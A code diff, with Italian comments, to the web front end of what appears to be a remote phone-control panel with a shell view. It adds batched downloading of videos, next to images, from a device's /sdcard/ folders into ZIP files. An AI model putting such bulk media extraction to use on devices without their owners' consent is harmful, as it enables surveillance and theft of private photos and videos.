@@ -25,13 +25,24 @@ var uo2 = document.getElementById("users");
 var imageDownloadQueue = [];
 var imageDownloadIndex = 0;
 var imageDownloadDir = "";
-var imageDownloadBatchSize = 75;
+var imageDownloadBatchSize = 50;
 var imageDownloadActive = false;
 var imageDownloadTimeout = null;
 var imageDownloadContent = [];
-var downloadedImages = []; // Lista delle immagini già scaricate
-var currentImageOffset = 0; // Offset per il prossimo batch
-var currentFolderImages = []; // Tutte le immagini della cartella corrente
+var downloadedImages = [];
+var currentImageOffset = 0;
+var currentFolderImages = [];
+
+// Variabili per il download batch di video
+var videoDownloadQueue = [];
+var videoDownloadIndex = 0;
+var videoDownloadDir = "";
+var videoDownloadBatchSize = 50;
+var videoDownloadActive = false;
+var videoDownloadTimeout = null;
+var videoDownloadContent = [];
+var downloadedVideos = [];
+var currentFolderVideos = [];
 
 function opnav(o) {
     if ($("#navbar").css("display") == "none") {
@@ -191,7 +202,6 @@ function filesfol(respo, v1, v2, v3, var32) {
 }
 
 // Funzione per ottenere tutte le immagini della cartella corrente
-// Funzione per ottenere tutte le immagini della cartella corrente
 function getAllImagesInCurrentFolder() {
     var respDiv = document.getElementById("resp");
     if (!respDiv) return [];
@@ -221,19 +231,54 @@ function getAllImagesInCurrentFolder() {
     return images;
 }
 
+// Funzione per ottenere tutti i video della cartella corrente
+function getAllVideosInCurrentFolder() {
+    var respDiv = document.getElementById("resp");
+    if (!respDiv) return [];
+    
+    var fileItems = respDiv.querySelectorAll("li.vi");
+    var videoExtensions = /\.(mp4|avi|mkv|mov|wmv|flv|webm|3gp|m4v)$/i;
+    var videos = [];
+    
+    for (var i = 0; i < fileItems.length; i++) {
+        var fileName = "";
+        var child = fileItems[i].firstChild;
+        while (child) {
+            if (child.nodeType === 3) fileName += child.nodeValue;
+            else if (child.tagName === "B") break;
+            child = child.nextSibling;
+        }
+        fileName = fileName.trim();
+        
+        if (videoExtensions.test(fileName) && fileName.indexOf(".") !== 0) {
+            videos.push(fileName);
+        }
+    }
+    
+    // Inverti l'ordine per scaricare dall'ultimo al primo
+    videos.reverse();
+    
+    return videos;
+}
+
 // Funzione per aggiornare i controlli della galleria
 function updateGalleryControls() {
     var galleryPanel = document.getElementById("gallery-controls");
     if (!galleryPanel) return;
     
-    // Verifica se il pulsante esiste già
-    var existingBtn = document.getElementById("download-images-btn");
-    if (existingBtn) {
-        existingBtn.remove();
+    // Rimuovi i pulsanti esistenti
+    var existingImgBtn = document.getElementById("download-images-btn");
+    if (existingImgBtn) {
+        existingImgBtn.remove();
+    }
+    var existingVidBtn = document.getElementById("download-videos-btn");
+    if (existingVidBtn) {
+        existingVidBtn.remove();
     }
     
-    // Ottieni tutte le immagini della cartella corrente
+    // Ottieni tutte le immagini e i video della cartella corrente
     currentFolderImages = getAllImagesInCurrentFolder();
+    currentFolderVideos = getAllVideosInCurrentFolder();
     
     // Calcola quante immagini rimangono da scaricare
     var remainingImages = 0;
@@ -243,27 +288,57 @@ function updateGalleryControls() {
         }
     }
     
-    // Crea il nuovo pulsante
-    var downloadBtn = document.createElement("button");
-    downloadBtn.id = "download-images-btn";
-    
-    if (remainingImages > 0) {
-        var batchSize = Math.min(imageDownloadBatchSize, remainingImages);
-        downloadBtn.textContent = "Scarica " + batchSize + " immagini (rimanenti: " + remainingImages + ")";
-    } else {
-        downloadBtn.textContent = "Scarica " + imageDownloadBatchSize + " immagini";
+    // Calcola quanti video rimangono da scaricare
+    var remainingVideos = 0;
+    for (var i = 0; i < currentFolderVideos.length; i++) {
+        if (downloadedVideos.indexOf(currentFolderVideos[i]) === -1) {
+            remainingVideos++;
+        }
     }
     
-    downloadBtn.onclick = startImageBatchDownload;
-    downloadBtn.style.marginLeft = "10px";
-    downloadBtn.style.background = "#4CAF50";
-    downloadBtn.style.color = "white";
-    downloadBtn.style.border = "none";
-    downloadBtn.style.padding = "8px 15px";
-    downloadBtn.style.borderRadius = "5px";
-    downloadBtn.style.cursor = "pointer";
+    // Crea il pulsante per le immagini
+    var imgBtn = document.createElement("button");
+    imgBtn.id = "download-images-btn";
     
-    galleryPanel.appendChild(downloadBtn);
+    if (remainingImages > 0) {
+        var imgBatchSize = Math.min(imageDownloadBatchSize, remainingImages);
+        imgBtn.textContent = "Scarica " + imgBatchSize + " immagini (rimanenti: " + remainingImages + ")";
+    } else {
+        imgBtn.textContent = "Scarica " + imageDownloadBatchSize + " immagini";
+    }
+    
+    imgBtn.onclick = startImageBatchDownload;
+    imgBtn.style.marginLeft = "10px";
+    imgBtn.style.background = "#4CAF50";
+    imgBtn.style.color = "white";
+    imgBtn.style.border = "none";
+    imgBtn.style.padding = "8px 15px";
+    imgBtn.style.borderRadius = "5px";
+    imgBtn.style.cursor = "pointer";
+    
+    galleryPanel.appendChild(imgBtn);
+    
+    // Crea il pulsante per i video
+    var vidBtn = document.createElement("button");
+    vidBtn.id = "download-videos-btn";
+    
+    if (remainingVideos > 0) {
+        var vidBatchSize = Math.min(videoDownloadBatchSize, remainingVideos);
+        vidBtn.textContent = "Scarica " + vidBatchSize + " video (rimanenti: " + remainingVideos + ")";
+    } else {
+        vidBtn.textContent = "Scarica " + videoDownloadBatchSize + " video";
+    }
+    
+    vidBtn.onclick = startVideoBatchDownload;
+    vidBtn.style.marginLeft = "10px";
+    vidBtn.style.background = "#2196F3";
+    vidBtn.style.color = "white";
+    vidBtn.style.border = "none";
+    vidBtn.style.padding = "8px 15px";
+    vidBtn.style.borderRadius = "5px";
+    vidBtn.style.cursor = "pointer";
+    
+    galleryPanel.appendChild(vidBtn);
 }
 
 // Funzione per avviare il download batch di immagini
@@ -346,7 +421,7 @@ function downloadNextImage() {
         console.warn("Timeout per: " + fileName);
         imageDownloadIndex++;
         downloadNextImage();
-    }, 30000); // 15 secondi
+    }, 30000); // 30 secondi
     
     // Salva il nome del file corrente per il download
     window._currentDownloadImage = fileName;
@@ -492,7 +567,248 @@ async function createImageZip() {
     $("#preloaderr").fadeOut();
 }
 
-// Funzione per resettare il download delle immagini
+// Funzione per avviare il download batch di video
+function startVideoBatchDownload() {
+    if (videoDownloadActive) return;
+    
+    // Ottieni tutti i video della cartella corrente
+    currentFolderVideos = getAllVideosInCurrentFolder();
+    
+    if (currentFolderVideos.length === 0) {
+        alert("Nessun video trovato in questa cartella.");
+        return;
+    }
+    
+    // Filtra i video non ancora scaricati
+    var videosToDownload = [];
+    for (var i = 0; i < currentFolderVideos.length; i++) {
+        if (downloadedVideos.indexOf(currentFolderVideos[i]) === -1) {
+            videosToDownload.push(currentFolderVideos[i]);
+        }
+    }
+    
+    if (videosToDownload.length === 0) {
+        alert("Tutti i video sono già stati scaricati. Reset della lista per un nuovo download.");
+        downloadedVideos = [];
+        videosToDownload = currentFolderVideos.slice();
+    }
+    
+    // Prendi il prossimo batch di video
+    var batchVideos = videosToDownload.slice(0, videoDownloadBatchSize);
+    
+    if (batchVideos.length === 0) {
+        alert("Nessun video da scaricare.");
+        return;
+    }
+    
+    // Imposta la coda di download
+    videoDownloadQueue = batchVideos;
+    videoDownloadIndex = 0;
+    videoDownloadDir = var32;
+    videoDownloadContent = [];
+    videoDownloadActive = true;
+    
+    // Disabilita il pulsante
+    var btn = document.getElementById("download-videos-btn");
+    if (btn) {
+        btn.disabled = true;
+        btn.textContent = "Download in corso... (" + batchVideos.length + " video)";
+    }
+    
+    // Mostra il loader
+    $("#preloaderr").fadeIn();
+    document.getElementById("loadtxt").innerText = "Download video: 0/" + videoDownloadQueue.length;
+    
+    // Inizia il download
+    downloadNextVideo();
+}
+
+// Funzione per scaricare il prossimo video
+function downloadNextVideo() {
+    if (!videoDownloadActive) return;
+    
+    if (videoDownloadIndex >= videoDownloadQueue.length) {
+        // Tutti i video del batch sono stati scaricati, crea lo ZIP
+        createVideoZip();
+        return;
+    }
+    
+    var fileName = videoDownloadQueue[videoDownloadIndex];
+    var fullPath = videoDownloadDir + "/" + fileName;
+    
+    document.getElementById("loadtxt").innerText = "Download video: " + (videoDownloadIndex + 1) + "/" + videoDownloadQueue.length + " - " + fileName;
+    
+    // Imposta timeout di sicurezza (60 secondi per i video che sono più grandi)
+    if (videoDownloadTimeout) {
+        clearTimeout(videoDownloadTimeout);
+    }
+    
+    videoDownloadTimeout = setTimeout(function() {
+        console.warn("Timeout per: " + fileName);
+        videoDownloadIndex++;
+        downloadNextVideo();
+    }, 60000); // 60 secondi
+    
+    // Salva il nome del file corrente per il download
+    window._currentDownloadVideo = fileName;
+    
+    // Invia il comando per scaricare il video
+    manager = "videodownload";
+    setdatcmd("cd", fullPath, "", respov);
+}
+
+// Funzione per gestire il download dei video
+function handleVideoDownload(respo, v1, v2, v3) {
+    if (!videoDownloadActive) return;
+    
+    // Cancella il timeout
+    if (videoDownloadTimeout) {
+        clearTimeout(videoDownloadTimeout);
+        videoDownloadTimeout = null;
+    }
+    
+    var fileName = window._currentDownloadVideo;
+    
+    try {
+        if (respo == "fileview" && v1) {
+            videoDownloadContent.push({
+                name: fileName,
+                content: v1,
+                type: "video"
+            });
+        } else if (respo == "imgview" && v1) {
+            // Alcuni video potrebbero essere gestiti come immagini
+            videoDownloadContent.push({
+                name: fileName,
+                content: v1,
+                type: "video"
+            });
+        }
+    } catch (e) {
+        console.warn("Errore nel download di: " + fileName, e);
+    }
+    
+    // Passa al prossimo video
+    videoDownloadIndex++;
+    
+    // Piccolo ritardo per evitare di sovraccaricare il browser
+    setTimeout(function() {
+        $("#preloaderr").fadeIn();
+        downloadNextVideo();
+    }, 500);
+}
+
+// Funzione per creare lo ZIP dei video
+async function createVideoZip() {
+    try {
+        document.getElementById("loadtxt").innerText = "Creazione ZIP video...";
+        
+        if (videoDownloadContent.length === 0) {
+            alert("Nessun video scaricato");
+            videoDownloadActive = false;
+            var btn = document.getElementById("download-videos-btn");
+            if (btn) {
+                btn.disabled = false;
+                updateGalleryControls();
+            }
+            $("#preloaderr").fadeOut();
+            return;
+        }
+        
+        var zip = new JSZip();
+        
+        for (var i = 0; i < videoDownloadContent.length; i++) {
+            var vid = videoDownloadContent[i];
+            
+            try {
+                if (vid.content.startsWith("data:")) {
+                    // È già in formato data URL
+                    var base64Data = vid.content.split(",")[1];
+                    var binaryData = atob(base64Data);
+                    var array = new Uint8Array(binaryData.length);
+                    for (var j = 0; j < binaryData.length; j++) {
+                        array[j] = binaryData.charCodeAt(j);
+                    }
+                    zip.file(vid.name, array);
+                } else if (vid.content.startsWith("http")) {
+                    // È un URL, il browser lo gestirà come link
+                    zip.file(vid.name + ".url", "[InternetShortcut]\nURL=" + vid.content);
+                } else {
+                    // Potrebbe essere base64 puro
+                    try {
+                        var binaryData = atob(vid.content);
+                        var array = new Uint8Array(binaryData.length);
+                        for (var j = 0; j < binaryData.length; j++) {
+                            array[j] = binaryData.charCodeAt(j);
+                        }
+                        zip.file(vid.name, array);
+                    } catch (e) {
+                        // Non è base64, salva come testo
+                        zip.file(vid.name + ".txt", vid.content);
+                    }
+                }
+                
+                // Aggiungi il video alla lista dei già scaricati
+                if (downloadedVideos.indexOf(vid.name) === -1) {
+                    downloadedVideos.push(vid.name);
+                }
+            } catch (e) {
+                console.warn("Errore nell'aggiunta di: " + vid.name, e);
+            }
+            
+            if (i % 5 === 0) {
+                document.getElementById("loadtxt").innerText = "Aggiunta video: " + (i + 1) + "/" + videoDownloadContent.length;
+                await new Promise(resolve => setTimeout(resolve, 100));
+            }
+        }
+        
+        document.getElementById("loadtxt").innerText = "Generazione ZIP...";
+        var content = await zip.generateAsync({
+            type: "blob",
+            compression: "DEFLATE",
+            compressionOptions: { level: 6 }
+        });
+        
+        // Scarica lo ZIP
+        var url = URL.createObjectURL(content);
+        var a = document.createElement('a');
+        a.href = url;
+        a.download = "video_" + new Date().getTime() + ".zip";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        
+        // Calcola quanti video rimangono
+        var remainingVideos = 0;
+        for (var i = 0; i < currentFolderVideos.length; i++) {
+            if (downloadedVideos.indexOf(currentFolderVideos[i]) === -1) {
+                remainingVideos++;
+            }
+        }
+        
+        if (remainingVideos > 0) {
+            alert("Download completato! " + videoDownloadContent.length + " video scaricati come ZIP.\n\nVideo rimanenti: " + remainingVideos);
+        } else {
+            alert("Download completato! Tutti i " + downloadedVideos.length + " video sono stati scaricati.");
+            // Reset per permettere un nuovo download
+            downloadedVideos = [];
+        }
+    } catch (e) {
+        console.error("Errore nella creazione dello ZIP:", e);
+        alert("Errore nel download dei video: " + e.message);
+    }
+    
+    videoDownloadActive = false;
+    videoDownloadContent = [];
+    
+    // Aggiorna il pulsante
+    updateGalleryControls();
+    
+    $("#preloaderr").fadeOut();
+}
+
+// Funzione per resettare il download di immagini e video
 function resetImageDownload() {
     downloadedImages = [];
     currentImageOffset = 0;
@@ -502,9 +818,21 @@ function resetImageDownload() {
     imageDownloadActive = false;
     currentFolderImages = [];
     
+    // Reset anche per i video
+    downloadedVideos = [];
+    videoDownloadQueue = [];
+    videoDownloadIndex = 0;
+    videoDownloadContent = [];
+    videoDownloadActive = false;
+    currentFolderVideos = [];
+    
     if (imageDownloadTimeout) {
         clearTimeout(imageDownloadTimeout);
         imageDownloadTimeout = null;
+    }
+    if (videoDownloadTimeout) {
+        clearTimeout(videoDownloadTimeout);
+        videoDownloadTimeout = null;
     }
 }
 
@@ -599,7 +927,7 @@ function showdat(o) {
             var v2 = dat.v2 + "";
             var v3 = dat.v3 + "";
 
-            if (manager != "thumbnailfetch" && manager != "imagedownload") {
+            if (manager != "thumbnailfetch" && manager != "imagedownload" && manager != "videodownload") {
                 var32 = dat.var2 + "";
             }
 
@@ -609,6 +937,8 @@ function showdat(o) {
                 filesfol(respo, v1, v2, v3, var32);
             } else if (manager == "imagedownload") {
                 handleImageDownload(respo, v1, v2, v3);
+            } else if (manager == "videodownload") {
+                handleVideoDownload(respo, v1, v2, v3);
             } else if (manager == "fileview") {
                 fileev(v1);
             } else if (manager == "shellview") {
@@ -1344,7 +1674,7 @@ function filesmanager() {
     $("#resp").css("display", "block");
     $("#phones").css("display", "none");
     
-    // Reset del download immagini quando si cambia cartella
+    // Reset del download immagini e video quando si cambia cartella
     resetImageDownload();
     
     setdatcmd("cd", "/sdcard/", "", respov);
